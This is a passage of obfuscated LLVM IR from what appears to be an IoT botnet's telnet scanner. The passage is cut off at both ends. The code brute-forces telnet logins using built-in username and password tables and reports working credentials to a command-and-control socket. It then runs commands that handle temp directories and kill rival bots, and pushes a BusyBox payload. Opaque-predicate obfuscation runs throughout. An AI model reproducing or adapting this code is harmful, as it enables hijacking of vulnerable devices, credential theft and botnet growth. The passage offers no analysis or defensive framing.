  br i1 %776, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %768
  %777 = load i32, i32* %6, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %778
  call void @reset_telstate(%struct.telstate_t* %779)
  %780 = load i32, i32* @x.91
  %781 = load i32, i32* @y.92
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %788

; <label>:788:                                    ; preds = %originalBBpart294, %originalBBpart290
  br label %1285

; <label>:789:                                    ; preds = %138
  %790 = load i32, i32* %6, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 8
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 6
  %799 = load i8, i8* %798, align 1
  %800 = zext i8 %799 to i64
  %801 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %800
  %802 = load i8*, i8** %801, align 8
  %803 = load i32, i32* %6, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 6
  %807 = load i8, i8* %806, align 1
  %808 = zext i8 %807 to i64
  %809 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %808
  %810 = load i8*, i8** %809, align 8
  %811 = call i64 @strlen(i8* %810) #9
  %812 = call i64 @send(i32 %794, i8* %802, i64 %811, i32 16384)
  %813 = icmp slt i64 %812, 0
  br i1 %813, label %814, label %834

; <label>:814:                                    ; preds = %789
  %815 = load i32, i32* @x.91
  %816 = load i32, i32* @y.92
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %814
  %823 = load i32, i32* %6, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %824
  call void @reset_telstate(%struct.telstate_t* %825)
  %826 = load i32, i32* @x.91
  %827 = load i32, i32* @y.92
  %828 = sub i32 %826, 1
  %829 = mul i32 %826, %828
  %830 = urem i32 %829, 2
  %831 = icmp eq i32 %830, 0
  %832 = icmp slt i32 %827, 10
  %833 = or i1 %831, %832
  br i1 %833, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1286

; <label>:834:                                    ; preds = %789
  %835 = load i32, i32* %6, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 8
  %840 = call i64 @send(i32 %839, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %841 = icmp slt i64 %840, 0
  br i1 %841, label %842, label %846

; <label>:842:                                    ; preds = %834
  %843 = load i32, i32* %6, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %844
  call void @reset_telstate(%struct.telstate_t* %845)
  br label %1286

; <label>:846:                                    ; preds = %834
  %847 = load i32, i32* %6, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %848
  call void @advance_telstate(%struct.telstate_t* %849, i32 6)
  br label %1285

; <label>:850:                                    ; preds = %138
  %851 = load i32, i32* %6, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 0
  %855 = load i32, i32* %854, align 8
  %856 = load i32, i32* %3, align 4
  %857 = load i32, i32* %6, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 11
  %861 = load i8*, i8** %860, align 8
  %862 = call i32 @read_until_response(i32 %855, i32 %856, i8* %861, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %863 = icmp ne i32 %862, 0
  br i1 %863, label %864, label %989

; <label>:864:                                    ; preds = %850
  %865 = call i64 @time(i64* null) #5
  %866 = trunc i64 %865 to i32
  %867 = load i32, i32* %6, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 9
  store i32 %866, i32* %870, align 8
  %871 = load i32, i32* %6, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 11
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 @contains_fail(i8* %875)
  %877 = icmp ne i32 %876, 0
  br i1 %877, label %878, label %882

; <label>:878:                                    ; preds = %864
  %879 = load i32, i32* %6, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %880
  call void @advance_telstate(%struct.telstate_t* %881, i32 0)
  br label %972

; <label>:882:                                    ; preds = %864
  %883 = load i32, i32* @x.91
  %884 = load i32, i32* @y.92
  %885 = sub i32 %883, 1
  %886 = mul i32 %883, %885
  %887 = urem i32 %886, 2
  %888 = icmp eq i32 %887, 0
  %889 = icmp slt i32 %884, 10
  %890 = or i1 %888, %889
  br i1 %890, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %882
  %891 = load i32, i32* %6, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 11
  %895 = load i8*, i8** %894, align 8
  %896 = call i32 @contains_success(i8* %895)
  %897 = icmp ne i32 %896, 0
  %898 = load i32, i32* @x.91
  %899 = load i32, i32* @y.92
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %897, label %906, label %967

; <label>:906:                                    ; preds = %originalBBpart2102
  %907 = load i32, i32* %6, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 4
  %911 = load i8, i8* %910, align 1
  %912 = zext i8 %911 to i32
  %913 = icmp eq i32 %912, 2
  br i1 %913, label %914, label %918

; <label>:914:                                    ; preds = %906
  %915 = load i32, i32* %6, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %916
  call void @advance_telstate(%struct.telstate_t* %917, i32 7)
  br label %966

; <label>:918:                                    ; preds = %906
  %919 = load i32, i32* @mainCommSock, align 4
  %920 = load i32, i32* %6, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %921
  %923 = call i8* @get_telstate_host(%struct.telstate_t* %922)
  %924 = load i32, i32* %6, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 5
  %928 = load i8, i8* %927, align 2
  %929 = zext i8 %928 to i64
  %930 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %929
  %931 = load i8*, i8** %930, align 8
  %932 = load i32, i32* %6, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 6
  %936 = load i8, i8* %935, align 1
  %937 = zext i8 %936 to i64
  %938 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %937
  %939 = load i8*, i8** %938, align 8
  %940 = call i32 (i32, i8*, ...) @sockprintf(i32 %919, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.867, i32 0, i32 0), i8* %923, i8* %931, i8* %939)
  %941 = load i32, i32* @mainCommSock, align 4
  %942 = load i32, i32* %6, align 4
  %943 = sext i32 %942 to i64
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %943
  %945 = call i8* @get_telstate_host(%struct.telstate_t* %944)
  %946 = load i32, i32* %6, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 5
  %950 = load i8, i8* %949, align 2
  %951 = zext i8 %950 to i64
  %952 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %951
  %953 = load i8*, i8** %952, align 8
  %954 = load i32, i32* %6, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 6
  %958 = load i8, i8* %957, align 1
  %959 = zext i8 %958 to i64
  %960 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %959
  %961 = load i8*, i8** %960, align 8
  %962 = call i32 (i32, i8*, ...) @sockprintf(i32 %941, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %945, i8* %953, i8* %961)
  %963 = load i32, i32* %6, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %964
  call void @advance_telstate(%struct.telstate_t* %965, i32 7)
  br label %966

; <label>:966:                                    ; preds = %918, %914
  br label %971

; <label>:967:                                    ; preds = %originalBBpart2102
  %968 = load i32, i32* %6, align 4
  %969 = sext i32 %968 to i64
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %969
  call void @reset_telstate(%struct.telstate_t* %970)
  br label %971

; <label>:971:                                    ; preds = %967, %966
  br label %972

; <label>:972:                                    ; preds = %971, %878
  %973 = load i32, i32* @x.91
  %974 = load i32, i32* @y.92
  %975 = sub i32 %973, 1
  %976 = mul i32 %973, %975
  %977 = urem i32 %976, 2
  %978 = icmp eq i32 %977, 0
  %979 = icmp slt i32 %974, 10
  %980 = or i1 %978, %979
  br i1 %980, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %972
  %981 = load i32, i32* @x.91
  %982 = load i32, i32* @y.92
  %983 = sub i32 %981, 1
  %984 = mul i32 %981, %983
  %985 = urem i32 %984, 2
  %986 = icmp eq i32 %985, 0
  %987 = icmp slt i32 %982, 10
  %988 = or i1 %986, %987
  br i1 %988, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1286

; <label>:989:                                    ; preds = %850
  %990 = load i32, i32* %6, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 9
  %994 = load i32, i32* %993, align 8
  %995 = add i32 %994, 7
  %996 = zext i32 %995 to i64
  %997 = call i64 @time(i64* null) #5
  %998 = icmp slt i64 %996, %997
  br i1 %998, label %999, label %1003

; <label>:999:                                    ; preds = %989
  %1000 = load i32, i32* %6, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1001
  call void @reset_telstate(%struct.telstate_t* %1002)
  br label %1003

; <label>:1003:                                   ; preds = %999, %989
  %1004 = load i32, i32* @x.91
  %1005 = load i32, i32* @y.92
  %1006 = sub i32 %1004, 1
  %1007 = mul i32 %1004, %1006
  %1008 = urem i32 %1007, 2
  %1009 = icmp eq i32 %1008, 0
  %1010 = icmp slt i32 %1005, 10
  %1011 = or i1 %1009, %1010
  br i1 %1011, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %1003
  %1012 = load i32, i32* @x.91
  %1013 = load i32, i32* @y.92
  %1014 = sub i32 %1012, 1
  %1015 = mul i32 %1012, %1014
  %1016 = urem i32 %1015, 2
  %1017 = icmp eq i32 %1016, 0
  %1018 = icmp slt i32 %1013, 10
  %1019 = or i1 %1017, %1018
  br i1 %1019, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %1285

; <label>:1020:                                   ; preds = %138
  %1021 = load i32, i32* @x.91
  %1022 = load i32, i32* @y.92
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %1020
  %1029 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1030 = call i32 (i8*, i8*, ...) @sprintf(i8* %1029, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.868, i32 0, i32 0), i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1031 = load i32, i32* %6, align 4
  %1032 = sext i32 %1031 to i64
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 0
  %1035 = load i32, i32* %1034, align 8
  %1036 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1037 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1038 = call i64 @strlen(i8* %1037) #9
  %1039 = call i64 @send(i32 %1035, i8* %1036, i64 %1038, i32 16384)
  %1040 = icmp slt i64 %1039, 0
  %1041 = load i32, i32* @x.91
  %1042 = load i32, i32* @y.92
  %1043 = sub i32 %1041, 1
  %1044 = mul i32 %1041, %1043
  %1045 = urem i32 %1044, 2
  %1046 = icmp eq i32 %1045, 0
  %1047 = icmp slt i32 %1042, 10
  %1048 = or i1 %1046, %1047
  br i1 %1048, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %1040, label %1049, label %1069

; <label>:1049:                                   ; preds = %originalBBpart2114
  %1050 = load i32, i32* @x.91
  %1051 = load i32, i32* @y.92
  %1052 = sub i32 %1050, 1
  %1053 = mul i32 %1050, %1052
  %1054 = urem i32 %1053, 2
  %1055 = icmp eq i32 %1054, 0
  %1056 = icmp slt i32 %1051, 10
  %1057 = or i1 %1055, %1056
  br i1 %1057, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %1049
  %1058 = load i32, i32* %6, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1059
  call void @reset_telstate(%struct.telstate_t* %1060)
  %1061 = load i32, i32* @x.91
  %1062 = load i32, i32* @y.92
  %1063 = sub i32 %1061, 1
  %1064 = mul i32 %1061, %1063
  %1065 = urem i32 %1064, 2
  %1066 = icmp eq i32 %1065, 0
  %1067 = icmp slt i32 %1062, 10
  %1068 = or i1 %1066, %1067
  br i1 %1068, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %1286

; <label>:1069:                                   ; preds = %originalBBpart2114
  call void @RemoveTempDirs()
  %1070 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1071 = call i32 (i8*, i8*, ...) @sprintf(i8* %1070, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.869, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1072 = load i32, i32* %6, align 4
  %1073 = sext i32 %1072 to i64
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1074, i32 0, i32 0
  %1076 = load i32, i32* %1075, align 8
  %1077 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1078 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1079 = call i64 @strlen(i8* %1078) #9
  %1080 = call i64 @send(i32 %1076, i8* %1077, i64 %1079, i32 16384)
  %1081 = icmp slt i64 %1080, 0
  br i1 %1081, label %1082, label %1086

; <label>:1082:                                   ; preds = %1069
  %1083 = load i32, i32* %6, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1084
  call void @reset_telstate(%struct.telstate_t* %1085)
  br label %1286

; <label>:1086:                                   ; preds = %1069
  %1087 = load i32, i32* @x.91
  %1088 = load i32, i32* @y.92
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %1086
  %1095 = load i32, i32* %6, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1096
  call void @advance_telstate(%struct.telstate_t* %1097, i32 8)
  %1098 = load i32, i32* @x.91
  %1099 = load i32, i32* @y.92
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %1285

; <label>:1106:                                   ; preds = %138
  %1107 = call i64 @time(i64* null) #5
  %1108 = trunc i64 %1107 to i32
  %1109 = load i32, i32* %6, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 9
  store i32 %1108, i32* %1112, align 8
  %1113 = load i32, i32* %6, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 0
  %1117 = load i32, i32* %1116, align 8
  %1118 = call i64 @send(i32 %1117, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.870, i32 0, i32 0), i64 4, i32 16384)
  %1119 = icmp slt i64 %1118, 0
  br i1 %1119, label %1120, label %1137

; <label>:1120:                                   ; preds = %1106
  %1121 = load i32, i32* @x.91
  %1122 = load i32, i32* @y.92
  %1123 = sub i32 %1121, 1
  %1124 = mul i32 %1121, %1123
  %1125 = urem i32 %1124, 2
  %1126 = icmp eq i32 %1125, 0
  %1127 = icmp slt i32 %1122, 10
  %1128 = or i1 %1126, %1127
  br i1 %1128, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %1120
  %1129 = load i32, i32* @x.91
  %1130 = load i32, i32* @y.92
  %1131 = sub i32 %1129, 1
  %1132 = mul i32 %1129, %1131
  %1133 = urem i32 %1132, 2
  %1134 = icmp eq i32 %1133, 0
  %1135 = icmp slt i32 %1130, 10
  %1136 = or i1 %1134, %1135
  br i1 %1136, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %1137

; <label>:1137:                                   ; preds = %originalBBpart2126, %1106
  %1138 = load i32, i32* %6, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 8
  %1143 = call i64 @send(i32 %1142, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.871, i32 0, i32 0), i64 7, i32 16384)
  %1144 = icmp slt i64 %1143, 0
  br i1 %1144, label %1145, label %1162

; <label>:1145:                                   ; preds = %1137
  %1146 = load i32, i32* @x.91
  %1147 = load i32, i32* @y.92
  %1148 = sub i32 %1146, 1
  %1149 = mul i32 %1146, %1148
  %1150 = urem i32 %1149, 2
  %1151 = icmp eq i32 %1150, 0
  %1152 = icmp slt i32 %1147, 10
  %1153 = or i1 %1151, %1152
  br i1 %1153, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %1145
  %1154 = load i32, i32* @x.91
  %1155 = load i32, i32* @y.92
  %1156 = sub i32 %1154, 1
  %1157 = mul i32 %1154, %1156
  %1158 = urem i32 %1157, 2
  %1159 = icmp eq i32 %1158, 0
  %1160 = icmp slt i32 %1155, 10
  %1161 = or i1 %1159, %1160
  br i1 %1161, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %1162

; <label>:1162:                                   ; preds = %originalBBpart2130, %1137
  %1163 = load i32, i32* @x.91
  %1164 = load i32, i32* @y.92
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %1162
  %1171 = load i32, i32* %6, align 4
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 0
  %1175 = load i32, i32* %1174, align 8
  %1176 = load i8*, i8** @Busybox_Payload, align 8
  %1177 = load i8*, i8** @Busybox_Payload, align 8
  %1178 = call i64 @strlen(i8* %1177) #9
  %1179 = call i64 @send(i32 %1175, i8* %1176, i64 %1178, i32 16384)
  %1180 = icmp slt i64 %1179, 0
  %1181 = load i32, i32* @x.91
  %1182 = load i32, i32* @y.92
  %1183 = sub i32 %1181, 1
  %1184 = mul i32 %1181, %1183
  %1185 = urem i32 %1184, 2
  %1186 = icmp eq i32 %1185, 0
  %1187 = icmp slt i32 %1182, 10
  %1188 = or i1 %1186, %1187
  br i1 %1188, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %1180, label %1189, label %1209

; <label>:1189:                                   ; preds = %originalBBpart2134
  %1190 = load i32, i32* @x.91
  %1191 = load i32, i32* @y.92
  %1192 = sub i32 %1190, 1
  %1193 = mul i32 %1190, %1192
  %1194 = urem i32 %1193, 2
  %1195 = icmp eq i32 %1194, 0
  %1196 = icmp slt i32 %1191, 10
  %1197 = or i1 %1195, %1196
  br i1 %1197, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1189
  %1198 = load i32, i32* %6, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1199
  call void @reset_telstate(%struct.telstate_t* %1200)
  %1201 = load i32, i32* @x.91
  %1202 = load i32, i32* @y.92
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br label %1286

; <label>:1209:                                   ; preds = %originalBBpart2134
  %1210 = load i32, i32* %6, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1211
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1212, i32 0, i32 0
  %1214 = load i32, i32* %1213, align 8
  %1215 = load i32, i32* %3, align 4
  %1216 = load i32, i32* %6, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 11
  %1220 = load i8*, i8** %1219, align 8
  %1221 = call i32 @read_until_response(i32 %1214, i32 %1215, i8* %1220, i32 1024, i8** bitcast ([10 x i8]* @.str.872 to i8**))
  %1222 = icmp ne i32 %1221, 0
  br i1 %1222, label %1223, label %1245

; <label>:1223:                                   ; preds = %1209
  %1224 = load i32, i32* %6, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 11
  %1228 = load i8*, i8** %1227, align 8
  %1229 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1228, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.872, i32 0, i32 0))
  %1230 = icmp ne i32 %1229, 0
  br i1 %1230, label %1231, label %1244

; <label>:1231:                                   ; preds = %1223
  %1232 = load i32, i32* %6, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 4
  %1236 = load i8, i8* %1235, align 1
  %1237 = zext i8 %1236 to i32
  %1238 = icmp ne i32 %1237, 3
  br i1 %1238, label %1239, label %1244

; <label>:1239:                                   ; preds = %1231
  %1240 = load i32, i32* %6, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 4
  store i8 3, i8* %1243, align 1
  br label %1244

; <label>:1244:                                   ; preds = %1239, %1231, %1223
  br label %1245

; <label>:1245:                                   ; preds = %1244, %1209
  %1246 = load i32, i32* %6, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 9
  %1250 = load i32, i32* %1249, align 8
  %1251 = add i32 %1250, 10
  %1252 = zext i32 %1251 to i64
  %1253 = call i64 @time(i64* null) #5
  %1254 = icmp slt i64 %1252, %1253
  br i1 %1254, label %1255, label %1284

; <label>:1255:                                   ; preds = %1245
  %1256 = load i32, i32* @x.91
  %1257 = load i32, i32* @y.92
  %1258 = sub i32 %1256, 1
  %1259 = mul i32 %1256, %1258
  %1260 = urem i32 %1259, 2
  %1261 = icmp eq i32 %1260, 0
  %1262 = icmp slt i32 %1257, 10
  %1263 = or i1 %1261, %1262
  br i1 %1263, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1255
  %1264 = load i32, i32* %6, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1265
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1266, i32 0, i32 4
  %1268 = load i8, i8* %1267, align 1
  %1269 = zext i8 %1268 to i32
  %1270 = icmp ne i32 %1269, 3
  %1271 = load i32, i32* @x.91
  %1272 = load i32, i32* @y.92
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
